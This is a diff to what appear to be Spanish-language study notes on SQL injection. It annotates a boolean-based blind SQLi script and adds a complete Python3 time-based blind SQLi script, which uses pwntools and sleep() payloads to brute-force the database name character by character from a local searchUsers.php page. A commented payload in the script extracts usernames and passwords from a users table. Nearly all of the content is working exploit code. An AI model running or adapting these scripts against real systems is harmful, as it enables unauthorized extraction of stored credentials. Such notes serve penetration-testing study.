@@ -125,7 +125,7 @@ def MakeSQLI():
     extrated_info = ""
 
     for position in range(1, 150):
-        for character in range(33, 126):
+        for character in range(33, 126): # El 9 de abajo es un valor que no existe
             sqli_url = main_url + "?id=9 or (select(select ascii(substring((select group_concat(username,0x3a,password) from users),%d,1)) from users where id = 1)=%d)" % (position, character)
 #           sqli_url = main_url + "?id=9 or (select(select ascii(substring((select group_concat(schema_name) from information_schema.schemata),%d,1)) from users where id = 1)=%d)" % (position, character)
             p1.status(sqli_url)
@@ -143,7 +143,48 @@ if __name__ == '__main__':
 
 * **SQL Time**: Parra este caso debemos de hacer el Script en Python3
 ```python 
+#!/usr/bin/python3
 
+import requests
+import signal
+import sys
+import time
+import string
+from pwn import *
+
+def def_handler(sig, frame):
+    print("\n\n[!] Saliendo...\n")
+    sys.exit(1)
+    
+# Ctrl + c
+signal.signal(signal.SIGINT, def_handler)
+
+# Variables globales
+main_url = "http://localhost/searchUsers.php"
+characters = string.printable
+
+def MakeSQLI():
+    p1 = log.progress("Fuerza Bruta")
+    p1.status("Iniciando fuerza bruta")
+    time.sleep(2)
+    p2 = log.progress("Datos extraidos")
+    extrated_info = ""
+
+    for position in range(1, 150):
+        for character in range(33, 126): # El 1 de abajo es un valor que si existe
+            sqli_url = main_url + "?id=1 and if(ascii(substr(database(),%d,1))=%d,sleep(0.35),1)" % (position, character)
+           #sqli_url = main_url + "?id=1 and if(ascii(substr((select group_concat(username,0x3a,password) from users),%d,1))=%d,sleep(0.35),1)" % (position, character)
+            p1.status(sqli_url)
+            time_start = time.time()
+            r = requests.get(sqli_url)
+            time_end = time.time()
+            if time_end - time_start > 0.35:
+                extrated_info += chr(character)
+                p2.status(extrated_info)
+                break
+
+if __name__ == '__main__':
+    MakeSQLI()
 ```
 
 
